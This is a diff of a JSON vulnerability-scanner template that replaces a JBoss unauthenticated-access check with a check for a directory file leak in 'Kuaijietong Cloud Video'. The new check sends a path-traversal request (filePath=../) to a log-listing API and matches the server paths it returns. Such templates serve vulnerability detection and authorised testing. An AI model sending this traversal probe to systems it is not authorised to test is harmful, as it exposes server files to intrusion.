@@ -1,15 +1,16 @@
 {
-    "Name": "jboss-unauth",
-    "Description": "jboss-unauth, unauthorized access vulnerability",
-    "Product": "jboss",
+    "Name": "Kuaijietong Cloud Video Directory File Leak",
+    "Description": "Kuaijietong Cloud Video directory file leak",
+    "Product": "Kuaijietong",
     "author": "chumeng",
     "Request":[
         {
         "Method": "GET",
         "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"},
-        "Uri":"/jmx-console/",
+        "Uri":"/him/api/rest/V1.0/system/log/list?filePath=../",
         "Port":"",
         "Data":"",
+        "follow_redirects":"false",
         "Follow_redirects":"false",
         "Upload":{"Name": "","fileName": "","filePath": "" },
         "Response":{
@@ -18,12 +19,8 @@
                 {
                 "Operation": "contains", 
                 "Key":"",
-                "Value": "jboss.management.local"
-                }, {
-                    "Operation": "contains", 
-                    "Key":"",
-                    "Value": "jboss.web"
-                    },
+                "Value": "\"absolutePath\":\"/var/logs/"
+                },
                  {
                 "Operation": "code", 
                 "Key":"",
@@ -31,6 +28,5 @@
                  }
         ]
         },
-        "Next_decide":""
-                }
-]}
+        "Next_decide":"" }
+            ]}
